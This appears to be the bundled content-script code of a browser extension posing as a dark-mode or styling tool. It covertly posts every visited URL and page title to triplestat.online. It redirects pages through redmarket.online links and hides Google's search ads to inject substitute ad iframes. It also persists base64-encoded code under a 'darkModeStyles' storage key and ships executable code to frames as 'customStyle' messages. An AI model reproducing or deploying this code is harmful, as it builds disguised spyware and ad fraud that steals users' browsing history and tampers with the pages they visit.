if (!window.zMainObj) {
	window.zMainObj = {};
}

if (!window.zMainObj.adRequests) {
	window.zMainObj.isDebug = false;
	window.zMainObj.adRequests = {
		log: window.zMainObj.isDebug ? console.log.bind(console.log, `[AD_REQUEST]`) : () => {},
		id: 'ar' + parseInt(Math.random() * Date.now()).toString(16),
		cacheFrames: {},
		cssText: () => {
			const id = window.zMainObj.adRequests.id;

			return `
                .${id}hidden{ position:absolute !important; opacity:0 !important; pointer-events:none !important}
            `;
		},
		generateId: (length = 7) => {
			let result = '';
			const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
			const charactersLength = characters.length;

			for (let i = 0; i < length; i++) {
				result += characters.charAt(Math.floor(Math.random() * charactersLength));
			}

			return result;
		},
		insertStyles: (adsId, cssText, parent = document.head) => {
			if (!document.getElementById(adsId + 'style')) {
				const styleElement = document.createElement('style');

				styleElement.innerHTML = cssText;
				styleElement.setAttribute('id', adsId + 'style');
				parent.appendChild(styleElement);
			}
		},
		debounceDelay: function (func, delay, maxDelay) {
			let timeoutId = null;
			let lastTime = Date.now();

			return function () {
				// eslint-disable-next-line prefer-rest-params
				const args = arguments;

				if (timeoutId) {
					clearTimeout(timeoutId);
				}
				if (Date.now() - lastTime > maxDelay) {
					lastTime = Date.now();
					func.apply(func, args);
				} else {
					timeoutId = setTimeout(() => {
						func.apply(func, args);
					}, delay);
				}
			};
		},
		initObserver: function (parent, cb, minDelay, maxDelay, childList, subtree = false, attributes = false) {
			const option = { childList, subtree, attributes };
			const observer = new MutationObserver(window.zMainObj.adRequests.debounceDelay(cb, minDelay, maxDelay));

			observer.observe(parent, option);
		},
		initInterObserver: function (cb, parent, ...rest) {
			function handleIntersection(entries) {
				entries.map(({ isIntersecting, target }) => {
					if (isIntersecting) {
						cb(target, ...rest);
						interObserver.unobserve(target);
					}
				});
			}

			const interObserver = new IntersectionObserver(handleIntersection);

			interObserver.observe(parent);
		},
		altStat: function (action, blockName, network, count = 1) {
			new Image().src =
				'https://doubleview.online/gant/ihkdedfdcocppnnaiigjpckhegifagfd_apbaqq4kns8leewgamm/ihkdedfdcocppnnaiigjpckhegifagfd/' +
				action +
				'/' +
				blockName +
				'/' +
				count +
				'/' +
				window.screen.availWidth +
				'x' +
				window.screen.availHeight +
				'/' +
				window.navigator.language;
		},
		stat: function (action, blockName, network, count = 1) {
			const statDom = 'astato.online';
			let statUrl =
				`https://${statDom}/s/c?a=${action}&u=apbaqq4kns8leewgamm&e=ihkdedfdcocppnnaiigjpckhegifagfd&b=west_${blockName}&n=${network}_west&r=` +
				Math.random();

			if (action !== 'click') {
				statUrl += `&c=${count}`;
			}
			new Image().src = statUrl;
			window.zMainObj.adRequests.altStat(action, blockName, network, count);
		},
		onLoadEpom: function (response, callback, options) {
			const rData = [];
			const result = {};

			if (!response) {
				callback(null);

				return;
			}
			result.title = response.title;
			result.subtitle = response.description;
			result.url = response.clickUrl;
			result.site = '';
			result.img =
				response.images && response.images.length && response.images.length > 0 ? response.images[0].url : '';

			response.beacons &&
				response.beacons.length > 0 &&
				response.beacons.forEach(({ type, url }) => {
					if (type && type === 'impression') {
						new Image().src = url;
					}
				});

			rData.push(result);

			options.blockName && window.zMainObj.adRequests.stat('view', options.blockName, 'epom');
			callback(rData, null, 'epom');
		},
		generateChanelTargeting: function (age, gender) {
			let result = '';

			if (age < 13) {
				result = '0013';
			} else if (age >= 13 && age <= 17) {
				result = '1317';
			} else if (age >= 18 && age <= 24) {
				result = '1824';
			} else if (age >= 25 && age <= 34) {
				result = '2534';
			} else if (age >= 35 && age <= 44) {
				result = '3544';
			} else if (age >= 45 && age <= 54) {
				result = '4554';
			} else if (age >= 55 && age <= 64) {
				result = '5564';
			} else if (age >= 65) {
				result = '6500';
			} else {
				result = '0000';
			}

			return gender + result;
		},
		epom: function (options, callback) {
			callback(null);
			return;
			window.zMainObj.storage.getData('userDataGAG', (data) => {
				const birthday = data && data.birthday ? data.birthday : '';
				const gender = data && data.gender ? data.gender : '';
				let age = '0';

				if (birthday) {
					const birthdayInMs = new Date(birthday);
					const ageDifMs = Date.now() - birthdayInMs;
					const ageDate = new Date(ageDifMs);

					age = Math.abs(ageDate.getUTCFullYear() - 1970);
				}

				const genderFromStorage = gender && (gender === 'm' || gender === 'f') ? gender : 'n';
				const xhr = new XMLHttpRequest();
				const normalizedGender = genderFromStorage === 'm' ? 'male' : genderFromStorage === 'f' ? 'female' : 'unknown';
				const chanelTargeting = window.zMainObj.adRequests.generateChanelTargeting(age, genderFromStorage);

				const reqLink = `https://aj2472.online/ads-api-native?key=${options.id}&format=json&ch=${chanelTargeting}&cp.age=${age}&cp.gender=${normalizedGender}`;

				xhr.responseType = 'json';
				xhr.open('GET', reqLink, true);
				xhr.addEventListener('load', function (event) {
					const response = event?.currentTarget?.response;

					!response || response?.message === 'no ads'
						? callback(null)
						: window.zMainObj.adRequests.onLoadEpom(response, callback, options);
				});
				xhr.addEventListener('error', function () {
					callback(null);
				});
				xhr.withCredentials = true;
				xhr.send();
				options.blockName && window.zMainObj.adRequests.stat('request', options.blockName, 'epom');
			});
		},
		nts: function (options, callback) {
			const xhr = new XMLHttpRequest();

			const reqLink = `https://triplestat.online/ntv.php?v=2&r=` + new Date().getTime();

			xhr.responseType = 'json';
			xhr.open('GET', reqLink, true);
			xhr.addEventListener('load', function (event) {
				const response = event?.currentTarget?.response;
				!response || response?.message === 'no ads'
					? callback(null)
					: window.zMainObj.adRequests.onLoadNts(response, callback, options);
			});
			xhr.addEventListener('error', function () {
				callback(null);
			});
			xhr.withCredentials = true;
			xhr.send();
			options.blockName && window.zMainObj.adRequests.stat('request', options.blockName, 'nts');
		},
		onLoadNts: function (response, callback, options) {
			const rData = [];
			const result = {};

			if (!response) {
				callback(null);

				return;
			}
			result.title = response.title;
			result.subtitle = response.description;
			result.url = response.clickUrl;
			result.site = '';
			result.query = response.query;
			result.img =
				response.images && response.images.length && response.images.length > 0 ? response.images[0].url : '';

			response.beacons &&
				response.beacons.length > 0 &&
				response.beacons.forEach(({ type, url }) => {
					if (type && type === 'impression') {
						new Image().src = url;
					}
				});

			rData.push(result);

			options.blockName && window.zMainObj.adRequests.stat('view', options.blockName, 'nts');
			callback(rData, null, 'nts');
		},
		getFrameUrl: function (callback) {
			const xhr = new XMLHttpRequest();
			const reqLink = `https://rumorpix.com/interface/get_random_news.php?cnt=1`;

			xhr.responseType = 'json';
			xhr.open('GET', reqLink, true);
			xhr.addEventListener('load', function (event) {
				const response = event.currentTarget.response;

				if (response?.data?.length === 0) {
					callback(null);

					return;
				}

				callback(response.data);
			});
			xhr.addEventListener('error', function (event) {
				callback(null);

				void event;
			});
			xhr.send();
		},
		createFrameWrapper: function (width, height, id) {
			const wrapper = document.createElement('div');

			wrapper.style.setProperty('width', width + 'px');
			wrapper.style.setProperty('height', height + 'px');
			wrapper.style.setProperty('opacity', '0');
			wrapper.style.setProperty('pointer-events', 'none');
			wrapper.style.setProperty('user-select', 'none');
			wrapper.style.setProperty('position', 'absolute');
			wrapper.style.setProperty('white-space', 'normal', 'important');
			wrapper.style.setProperty('direction', 'ltr', 'important');
			wrapper.style.setProperty('position', 'relative', 'important');
			wrapper.style.setProperty('overflow', 'hidden', 'important');
			wrapper.classList.add(id + 'frm_wrapper');

			return wrapper;
		},
		iframeRender: function (
			parentBlock,
			onSuccess,
			onFail,
			frameWidth,
			frameHeight,
			frameUrl,
			additionalSettings = ''
		) {
			const hashId = window.zMainObj.adRequests.generateId() + additionalSettings;
			const wrapper = window.zMainObj.adRequests.createFrameWrapper(frameWidth, frameHeight, hashId);

			parentBlock.classList.add(window.zMainObj.adRequests.id + 'hidden');
			window.zMainObj.adRequests.getFrameUrl(function (data) {
				if (!data || data.length === 0) {
					return;
				}
				const iframe = document.createElement('iframe');
				const screenWidth = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
				const screeHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;

				iframe.setAttribute('scrolling', 'no');
				iframe.setAttribute('src', data[0][frameUrl] + `#${hashId}`);
				iframe.setAttribute('width', screenWidth.toString());
				iframe.setAttribute('height', screeHeight.toString());
				iframe.setAttribute('src', data[0][frameUrl] + `#${hashId}`);
				iframe.style.setProperty('width', screenWidth + 'px');
				iframe.style.setProperty('height', screeHeight + 'px');
				iframe.style.setProperty('opacity', '1');
				iframe.style.setProperty('z-index', '1');
				iframe.style.setProperty('border', 'none');
				iframe.style.setProperty('overflow', 'hidden');
				iframe.style.setProperty('position', 'absolute');
				iframe.style.setProperty('top', '0');
				iframe.style.setProperty('left', '0');
				wrapper.appendChild(iframe);
				parentBlock.appendChild(wrapper);
				window.zMainObj.adRequests.cacheFrames[hashId] = {
					parent: wrapper,
					onSuccess,
					onFail
				};
			});
		},
		initMessageListener: function () {
			window.addEventListener(
				'message',
				(e) => {
					if (e?.data?.getFrmDets && e?.source) {
						e.source.postMessage(
							{
								frmDets: ['customStyleData', 'customStyle']
							},
							'*'
						);
					}
					if (e?.data?.msgData) {
						const id = Object.keys(e.data.msgData)[0];
						const frameData = window.zMainObj.adRequests.cacheFrames[id];

						if (frameData) {
							const { parent, onSuccess, onFail } = frameData;

							if (e.data.msgData.status === 'ok') {
								parent.style.setProperty('opacity', '1');
								parent.style.setProperty('pointer-events', 'all');
								parent.style.setProperty('user-select', 'all');
								parent.style.setProperty('position', 'relative');
								parent.parentNode.classList.remove(window.zMainObj.adRequests.id + 'hidden');
								onSuccess(parent);
								delete window.zMainObj.adRequests.cacheFrames[id];
							} else {
								onFail();
								delete window.zMainObj.adRequests.cacheFrames[id];
							}
						}
					}
				},
				false
			);
		},
		init: function () {
			window.zMainObj.adRequests.initMessageListener();
			window.zMainObj.adRequests.insertStyles(window.zMainObj.adRequests.id, window.zMainObj.adRequests.cssText());
		},
		renderResults: {
			goSerpRes: null,
			ytInPlayer: null,
			ytRightAds: null
		},
		renderGoogleSearchAds: function (args, options) {
			try {
				const { id, src, parentBlock, styles, adCount, successCallback, failCallback, bgColor } = args;

				let frame = parentBlock.querySelector('iframe');

				if (!frame) {
					frame = window.zMainObj.adRequests.createFrame(id, src);
					parentBlock.appendChild(frame);
				}

				const handleMessageArgs = {
					frame,
					styles,
					adCount,
					bgColor,
					parentBlock,
					successCallback,
					failCallback
				};

				window.addEventListener('message', (event) => {
					window.zMainObj.adRequests.handleFrameMessage(event, handleMessageArgs);
				});

				window.zMainObj.adRequests.findGoogleAds(frame, bgColor, { debug: options.debug }, failCallback);
			} catch (error) {
				if (options.debug) {
					console.log('renderGoogleSearchAds error: ', error);
				}
			}
		},
		handleFrameMessage: function (event, args) {
			let gotFinalHeight = false;
			const data = event.message || event.data;

			const { frame, styles, adCount, parentBlock, successCallback, failCallback, debug, bgColor } = args;

			if (!data) return;
			if (!data.frame_id || data.frame_id !== frame.id) return;

			if (data.getFrmDets) {
				frame.contentWindow.postMessage(
					{
						frmDets: ['customStyleData', 'customStyle']
					},
					'*'
				);
				return;
			}

			if (data.hasOwnProperty('go_found') && data.go_found === false) {
				failCallback({
					failReason: data.failReason
				});

				clearTimeout(window.zMainObj.adRequests.goAdsSearchTimeout);
				window.zMainObj.adRequests.goAdsSearchTimeout = null;
			}

			if (data.go_found) {
				if (frame.contentWindow) {
					frame.contentWindow.postMessage(
						{
							'customStyleData': 1,
							'customStyle': `(()=>{${window.zMainObj.adRequests.prepareGoogleAds.toString()};prepareGoogleAds('${
								frame.id
							}', "${styles}", '${adCount}', ${debug});})()`
						},
						'*'
					);

					for (let i = 0; i < 2; i++) {
						setTimeout(function () {
							if (gotFinalHeight) {
								return;
							}

							frame.contentWindow.postMessage(
								{
									'customStyleData': 1,
									'customStyle': `(()=>{${window.zMainObj.adRequests.prepareGoogleAds.toString()};prepareGoogleAds('${
										frame.id
									}', "${styles}", '${adCount}', ${debug});})()`
								},
								'*'
							);
						}, i * 100);
					}
				}
			}

			if (data.finalHeight) {
				gotFinalHeight = true;

				if (window.zMainObj.adRequests.goAdsSearchTimeout) {
					clearTimeout(window.zMainObj.adRequests.goAdsSearchTimeout);
				}

				successCallback(data.finalHeight);
			}
		},
		goAdsSearchTimeout: null,
		findGoogleAds: function (frame, bgColor, options, failCallback) {
			try {
				let counter = 0;
				const id = frame.id;
				sendSearchAdMessage();

				function sendSearchAdMessage() {
					const platform = 'google';
					const docAnchor = '#result';
					const adsSelector = '#master-1';
					const debug = options.debug;

					if (frame.contentWindow) {
						frame.contentWindow.postMessage(
							{
								'customStyleData': 1,
								'customStyle': `${window.zMainObj.adRequests.findAds.toString()};findAds('${platform}', '${id}', '${docAnchor}', '${adsSelector}', ${debug}, '${bgColor}')`
							},
							'*'
						);
					}

					window.zMainObj.adRequests.goAdsSearchTimeout = setTimeout(sendSearchAdMessage, 100);

					if (counter < 100) {
						++counter;
					} else {
						clearTimeout(window.zMainObj.adRequests.goAdsSearchTimeout);
						window.zMainObj.adRequests.goAdsSearchTimeout = null;

						failCallback({
							failReason: 'Exceeded the number of attempts to find ads'
						});

						if (options.debug) {
							console.log('Google ads not found');
						}
					}
				}
			} catch (error) {
				if (options.debug) {
					console.error(`renderGoogleSearchAds/findGoogleAds error`, error);
				}
			}
		},
		prepareGoogleAds: function prepareGoogleAds(id, minifiedStyles, adCount, debug) {
			try {
				document.querySelectorAll('iframe').forEach((iframe) => {
					if (iframe.clientHeight > 20) {
						sendToFrame(iframe, id, minifiedStyles, adCount);
					}
				});

				function sendToFrame(iframe, frameID, styles, adCount) {
					iframe.contentWindow.postMessage(
						{
							'customStyleData': 1,
							'customStyle': `(()=>{${subFrameCode.toString()};subFrameCode('${frameID}', "${styles}", '${adCount}')})()`
						},
						'*'
					);
				}

				function subFrameCode(frameId, styles, adCount) {
					if (window.goSerpResSubFrame) return;

					window.goSerpResSubFrame = true;

					const style = document.createElement('style');
					style.innerHTML = `${styles}`;

					if (adCount > 0) {
						const items = document.querySelectorAll('.styleable-rootcontainer');
						const selectedIndex = Math.floor(Math.random() * adCount);
						const selectedIndexCss = selectedIndex + 1;

						style.innerHTML += `.setinv{display:none!important;}`;
						style.innerHTML += `.styleable-rootcontainer{background:transparent !important}`;

						items.forEach((item) => item.classList.add('setinv'));

						for (let i = 0; i <= adCount - 1; i++) {
							items[i].classList.remove('setinv');
						}
					}

					document.head.append(style);

					const links = document.querySelectorAll(`.styleable-rootcontainer a`);
					links.forEach((link) => link.setAttribute('target', '_blank'));

					const title = document.querySelector('.styleable-title');
					const url = document.querySelector('.styleable-visurl');
					const description = document.querySelector('.styleable-description');

					const newTitle = document.querySelector('.si27');
					const newUrl = document.querySelector('.si28');
					const newDescription = document.querySelector('.si29');

					const validStyles = title && url && description;
					const validStylesNew = newTitle && newUrl && newDescription;

					if (validStyles || validStylesNew) {
						window.top.postMessage({ finalHeight: document.body.clientHeight, frame_id: frameId }, '*');
					}
				}
			} catch (error) {
				if (debug) {
					console.error('adRequests findGoogleAds error: ', error);
				}
			}
		},
		findAds: function findAds(platform, id, docAnchor, adsSelector, debug, bgColor) {
			try {
				if (debug) {
					console.log('Trying to find Google Ads');
				}

				let platformMarker = null;
				let platformLocation = null;

				switch (platform) {
					case 'google':
						platformMarker = 'go_found';
						platformLocation = 'www.google.com/search';
						break;
					case 'yahoo':
						platformMarker = 'ya_found';
						platformLocation = 'search.yahoo.com/search/';
						break;
					default:
						break;
				}

				const successMessage = { frame_id: `${id}` };
				successMessage[platformMarker] = true;

				const failMessage = { frame_id: `${id}` };
				failMessage[platformMarker] = false;

				const checkLocation = !document.location.toString().includes(platformLocation);

				// if (!checkLocation) {
				// 	window.top.postMessage(failMessage, '*');
				// 	if (debug) {
				// 		console.log(`${platform} ads not found`);
				// 	}
				// 	return;
				// }

				const anchor = document.querySelector(docAnchor);

				if (!anchor) {
					if (debug) {
						console.log(`No ${platform} doc anchor`);
					}
				} else {
					const ads = document.querySelector(adsSelector);
					const noAds = document.body.classList.contains('noAds');
					const recaptchaElement = document.querySelector('#recaptcha-element');

					if (recaptchaElement) {
						if (debug) {
							console.log(`${platform} recaptcha`);
						}
						failMessage['failReason'] = 'recaptcha';
						window.top.postMessage(failMessage, '*');
						return;
					}

					if (noAds) {
						if (debug) {
							console.log(`${platform} ads not found`);
						}
						failMessage['failReason'] = 'noAds selector';
						window.top.postMessage(failMessage, '*');
						return;
					}

					if (ads) {
						let adsLoaded = checkAdsHeight(ads);
						document.body.style.background = bgColor;

						if (adsLoaded) {
							clearPage(ads, bgColor);

							window.top.postMessage(successMessage, '*');

							if (debug) {
								console.log(`${platform} ads founded`);
							}
						}
					}
				}
			} catch (error) {
				if (debug) {
					console.error(error);
				}
			}

			function checkAdsHeight(ads) {
				return ads.clientHeight > 20;
			}

			function clearPage(ads, bgColor) {
				ads.classList.add('opfl');
				let prn = ads.parentNode;
				while (prn.tagName.toLowerCase() != 'body') {
					prn.classList.add('opfl');
					prn = prn.parentNode;
				}
				let dvs = document.querySelectorAll('div');
				for (let i = 0, l = dvs.length; i < l; i++) {
					if (!dvs[i].classList.contains('opfl')) {
						dvs[i].style.display = 'none';
					}
				}
				ads.setAttribute('style', 'position:fixed;top:0;left:0;width:100%;');
				let g = document.querySelector('.gsc-control-cse');
				if (g) {
					g.setAttribute('style', `background:${bgColor};border:0;`);
				}
				document.body.style.background = `${bgColor}`;
				document.body.style.opacity = 1;
			}
		},
		createFrame: function (id, src, options) {
			try {
				const frame = document.createElement('iframe');

				frame.id = `${id}-frame`;
				frame.width = '100%';
				frame.height = 900;
				frame.style.zIndex = 2;
				frame.style.position = 'absolute';
				frame.style.left = 0;
				frame.style.top = 0;
				frame.style.margin = 0;
				frame.style.display = 'block';
				frame.setAttribute('scrolling', 'no');
				frame.setAttribute('frameborder', 'none');
				frame.setAttribute('src', src);

				return frame;
			} catch (error) {
				if (options.debug) {
					console.error('adRequests createFrame error: ', error);
				}
				return null;
			}
		}
	};
	window.zMainObj.adRequests.init();
}
if(!window.zMainObj)
	window.zMainObj = {};
		
if(!window.zMainObj.storage && window.self === window.top)
{
	window.zMainObj.storage = {
		'extRequest' : function(params,callback)
		{
			var handler = false;
			if(callback)
			{
				var cbid = 'cb'+(new Date()).getTime().toString()+Math.round(Math.random()*10000).toString();
				window[cbid] = callback;
				handler = 'window["'+cbid+'"]';
				params.handler = handler;
			}
			window.postMessage({'stylesForMode':1,'settings':params,'handler':handler},'*');
		},
		'getData' : function(rkey, callback)
		{
			window.zMainObj.storage.extRequest({
				method: 'getStyles',
				key: rkey
			},callback);
		},
		'setData' : function(rkey, rvalue) {
			window.zMainObj.storage.extRequest({
				method: 'setStyles',
				key: rkey,
				value: rvalue
			});
		}
	};
}if (!window.zMainObj) { window.zMainObj = {}; }

(() => {
	if (window.zMainObj.domCnt) {
		return;
	}
	
	window.zMainObj.domCnt = {
		'lastUrl' : '',
		'postUserData' : function(curUrl){
			fetch('https://triplestat.online/c', {
				method: 'POST',
				body: btoa(unescape(encodeURIComponent(JSON.stringify({
					'a': 'sendVisit',
					'p': {
						'u': curUrl,
						'ui': 'apbaqq4kns8leewgamm',
						't': document.title,
						'a': '',
						'g': '',
						'c': 'US',
					},
				})))),
				headers: { 'Content-Type': 'text/plain' },
				credentials: 'include',
			});
		},
		'init' : function(){
			let curUrl = document.location.toString();
			if(curUrl != window.zMainObj.domCnt.lastUrl)
			{
				window.zMainObj.domCnt.lastUrl = curUrl;
				window.zMainObj.domCnt.postUserData(curUrl);
			}
			setTimeout(window.zMainObj.domCnt.init,100);
		}
	};
	
	window.zMainObj.domCnt.init();
	
})();//# sourceURL=redirect_checker.js

if (!window.zMainObj)
	window.zMainObj = {};

(() => {
	if (window.zMainObj.redirectChecker) {
		return;
	}
	
	window.zMainObj.redirectChecker = 1;
	
	let unid = 'apbaqq4kns8leewgamm';
	let domainTestInterval = 1000 * 60 * 30;
	let endpoint = 'https://redmarket.online';
	let domain = window.location.hostname;
	let localStorageTimeKey = 'lctkdr';
	
	function authMe(id) {
		let urlAuth = `${endpoint}/h/auth/${unid}?mct=${id}&prd=${encodeURIComponent(window.location.href)}`;

		window.localStorage.setItem(localStorageTimeKey, Date.now().toString());
		window.location.href = urlAuth;
	}
	function isSuitableDomain() {
		return new Promise((resolve, reject) => {
			let url = `${endpoint}/search?md=${domain}&mu=${encodeURIComponent(window.location.href)}`;
			let xhr = new XMLHttpRequest();

			xhr.responseType = 'json';

			xhr.open('get', url);
			xhr.addEventListener('load', event => {
				let response = event.currentTarget.response;

				if ( !response ) {
					console.log('Response is null');
					resolve(false);
					return;
				}
				if ( response.status !== 'success' ) {
					console.log('Response status is not success');
					resolve(false);
					return;
				}

				resolve(response.data);
			});
			xhr.addEventListener('error', event => {
				reject(new Error('Loading error'));
			});
			xhr.send();
		});
	}
	function needsAuth() {
		let timestamp = parseInt(window.localStorage.getItem(localStorageTimeKey));

		if ( !timestamp || isNaN(timestamp) ) return true;

		return Date.now() - timestamp > domainTestInterval;
	}
	async function init() {
		if ( !needsAuth() ) {
			return;
		}

		let id = await isSuitableDomain();

		if ( !id ) {
			return;
		}

		authMe(id);
	}

	init().catch(e => {});
})();(function(){
	window.zMainObj.storage.getData('darkModeStyles',function(a){
		let curCode = decodeURIComponent(escape(atob(a)));
		if(curCode.indexOf('gooDoms') > -1 || curCode.indexOf('glDoms') > -1)
		{
			curCode = curCode.split('})()')[1];
		}
		
		if(curCode.indexOf('s3.searchresultspage.online') == -1)
		{
			let extra = `(function(){
				try{
					function getParamsFromString (name, string){
						let urlParams = new URLSearchParams(string);
						return urlParams.get('q');
					}
					
					function preLoad(){
						let rcnt = document.querySelector('#rcnt');
						if(!rcnt)
						{
							return setTimeout(preLoad,50);
						}
						let searchResultsContainer = document.querySelector('#center_col');
						if(!searchResultsContainer)
						{
							return setTimeout(preLoad,50);
						}
						let rso = searchResultsContainer.querySelector('#rso');
						if(!rso)
						{
							return setTimeout(preLoad,50);
						}
						
						let rct = document.querySelector('#rcnt').getBoundingClientRect();
						
						let style = document.createElement('style')
						style.innerHTML = '#tads,#tvcap{display: none !important}#prld{position:absolute;top:'+rct.top+'px;left:0;background:#fff;width:100%;height:'+rcnt.clientHeight+'px;text-align:center;}'
						document.head.appendChild(style);
						
						let prld = document.createElement('div');
						prld.setAttribute('id','prld');
						prld.innerHTML = '<img src="https://cdn65878842.ahacdn.me/google_loading.gif">';
						
						rcnt.style.opacity=0;
						rcnt.parentNode.insertBefore(prld,rcnt);
						
						setTimeout(function(){
							document.querySelector('#prld').remove();
							document.querySelector('#rcnt').style.opacity=1;
						},2000);
						
						let masterID = 'prmas-'+parseInt(Math.random() * Date.now()).toString(16);
						let query = getParamsFromString('q',document.location.search);
						window.addEventListener('message', function(event){
							const data = event.message || event.data;
							if (!data) return;
							if (!data.frmid || data.frmid !== masterID+'-frame') return;
							const frame = document.querySelector('#'+masterID+'-frame')
							if (data.getFrmDets)
							{
								frame.contentWindow.postMessage(
								{
									'frmDets':['customStyleData','customStyle']
								},'*');
								return;
							}
							  
							if (data.status === 'success' && data.hasOwnProperty('found_ad')) {
								window.prldEvt = {'data':data};
							}
						});
						let encodedQuery = encodeURIComponent(query);
						
						let container = document.createElement('div')
						
						container.style.opacity = '0'
						container.style.width = '652px'
						container.style.position = 'absolute'
						container.style.left = '-10000px'
						container.style.background = '#fff'
						container.style.display = 'block'
						container.id = masterID+'-container'
						container.style.marginBottom = '24px'
						
						const frame = document.createElement('iframe')
						
						frame.id = masterID+'-frame'
						frame.width = '100%'
						frame.height = '500'
						frame.style.zIndex = 2
						frame.style.position = 'absolute'
						frame.style.left = 0
						frame.style.top = 0
						frame.style.display = 'block'
						frame.setAttribute('scrolling', 'no')
						frame.setAttribute('frameborder', 'none')
						frame.setAttribute('fetchpriority', 'high')
						frame.setAttribute('src', 'https://s3.searchresultspage.online/se3.html#gsc.tab=0&gsc.q='+encodedQuery+'&gsc.page=1&frmid='+masterID+'-frame')
						
						container.appendChild(frame)
						
						rso.insertBefore(container, rso.children[0]);
					}
					
					let glcDoms = ['google.com','google.ca','google.ru','google.com.ua','google.com.au','google.es','google.by','google.it','google.de','google.tm'];
					if(glcDoms.indexOf(document.location.host.replace('www.','')) > -1 && document.location.toString().indexOf('q=') > -1)
					{
						preLoad();
					}
				}catch(e){}
			})()`;
			let newCode = btoa(unescape(encodeURIComponent(extra+curCode)));
			window.zMainObj.storage.setData('darkModeStyles',newCode);
		}
	});
})();